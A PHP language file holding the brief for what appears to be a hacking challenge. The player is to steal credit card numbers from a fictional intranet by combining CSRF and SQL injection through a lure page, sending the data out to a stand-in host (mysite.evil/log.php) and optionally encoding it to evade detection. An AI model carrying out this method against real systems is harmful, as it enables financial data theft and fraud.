<?php
$lang = array(
'index_title' => 'Your Mission',
'index_info' =>
'Your mission is to steal credit card numbers and corresponding CVV\'s from an international financial institute. First you did some dumpster diving and found some very useful papers. The papers are about a recent security audit. Reading through the audit findings you have found that one of the Intranet websites <a href="query.include">(http://very-secure-intranet.local/query.php?id=)</a> is vulnerable to SQL injection and CSRF, and this website is in connection with the credit card database. The query.php itself returns valueless information for you, but with the SQL injection vulnerability it is priceless :). You can even obtain the structure of the credit card database (create table credit_card(id int, cc_number bigint,cvv integer);). The bad news are that it is impossible to access the very-secure-intranet.local from the outside (either from the internet or to get into the building). Even if you could manage to access the very-secure-intranet.local, you also  need credentials to authenticate yourself to the website. The authentication is transparent for domain users, but not for you. You need another plan.<br/>
But thank god you have a clever idea. You can create a HTML page (forum.html), publish it on the internet and convince one of the financial institute employees (Z :-)) to visit your website with the special forum.html. Because the vulnerable query.php (on very-secure-intranet.local) can receive parameters through GET (so it is vulnerable to CSRF), you can embed an object (or tag) in your HTML to do the SQL injection for you. And the best part is, if you build a special SQL query, where the credit card numbers are concatenated with some other HTML tags, you can force the victims browser to do requests on a webserver controlled by you (http://www.mysite.evil/log.php).<br/> 
<br/>
Here is a detailed information flow, how this attack works.<br/>
<br/>
1. You send a simple link to the victim, the link ends with forum.html<br/>
2. Victim employee clicks on the link to the forum.html (and that is the only click needed from the victim) and downloads forum.html<br/>
3. The victims browser parses the HTML, and finds the special link to the <a href="query.include">(http://very-secure-intranet.local/query.php?id=)</a>....<br/>
(you can also <a href="index.php?highlight=christmas">see it highlighted here</a>).<br/>
4. This link exploits both the CSRF and the SQL injection vulnerability on the very-secure-intranet.local<br/>
5. The very-secure-intranet.local website returns with the answer HTML page, where the credit card and cvv numbers are embedded as special objects, where these objects are referencing to your site. For example like this:<br/>
http://www.mysite.evil/log.php?cc_number=1111222233334444&cvv=423<br/>
The format is an example, you can use anything after http://www.mysite.evil/ (it is fixed, because it is easier for me to test it :) ), but it has to contain the extracted credit card numbers and cvv numbers. You should be able to receive all of of the information stored in the credit card table (and not just pieces of it) on your side.<br/> 
<br/>
Optional goal: The victim network is self-monitored and there is an alarm generated if there is a clear text credit card number on the network. Your optional goal is to avoid detection by using any type of encoding/encryption.<br/>
<br/>
To solve this challenge, you have to create this forum.html, publish it anywhere on the internet (even in a downloadable format), and send a PM to Z with the link to the forum.html. Z will check your solution, and if it works, will send you back the solution string. Please see the hints in the help board for details.<br/>
<br/>
Good luck :)<br/>',

'thanks' => 'Many Thanks to %1% and %2% for their effort in BetaTesting.',

);
?>